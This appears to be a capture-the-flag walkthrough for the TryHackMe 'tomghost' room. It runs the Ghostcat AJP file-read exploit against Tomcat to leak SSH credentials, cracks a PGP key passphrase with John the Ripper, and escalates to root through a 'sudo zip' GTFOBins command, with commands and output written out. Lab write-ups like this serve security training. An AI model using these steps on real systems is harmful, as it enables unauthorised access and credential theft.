# tomghost

> RedAiden

## Enumeration

### Nmap

Start a basic Nmap scan.

`nmap -sC -sV 10.10.`

```
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:7F:0A:D4:FF:79 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Scanning Port 8080

If we enter to `10.10.x.x:8080` we can find the page to Apache Tomcat/9.0.30. Given the name of the room, we can assume we must take advantage of the [__GHOST CAT__](https://medium.com/@prem2/ghostcat-vulnerability-cve-2020-1938-ajp-lfi-apache-tomcat-server-vulnerability-9f57330e3eb1) vulnerability.

## Exploitation

1. Download the python script from the [GitHub Repo](https://github.com/00theway/Ghostcat-CNVD-2020-10487)
2. Run the script `python3 ajpShooter.py http://10.10.207.197:8080 8009 /WEB-INF/web.xml read`
3. From the ouutput we can get the following credentials: `skyfuck:8730*************`
```

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730*********
  </description>

</web-app>
```
4. SSH into the machine with the newly found credentials `ssh skyfuck@10.10.x.x -p 22`
5. We are now the user skyfuck

## Privelege Escalation

1. If we do `ls` we find two new files: `credential.pgp` and `tryhackme.asc`
2. From your machine, download the files `scp skyfuck@10.10.x.x:/home/skyfuck/* .`
3. Convert the `tryhackme.asc` file into a hash that __John The Ripper__ can read: `sudo gpg2john tryhackme.asc > hash`
4. Give the new hash to john the ripper: `sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`
```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alex*****        (tryhackme)
1g 0:00:00:00 DONE (2021-01-05 06:27) 5.263g/s 5642p/s 5642c/s 5642C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
5. Import the Armored ASCII file `gpg --import tryhackme.asc`
   - Use the passphrase we found: `alex*****`
6. Decrypt the Pretty Good Privacy file `gpg --decrypt credential.pgp`

```
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
7. Log in to ssh with the new user and password
8. Once inside the new shell, we can find the user flag.
9. Do `sudo -l` to check our permissions
10. Look like we can run `/usr/bin/zip` as sudo. Time to check for a vulnerability in gtfobins
11. Once we find the exploit, run the commands:
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```
12. You should now be root, check with `whoami`
13. The flag is located in `/root`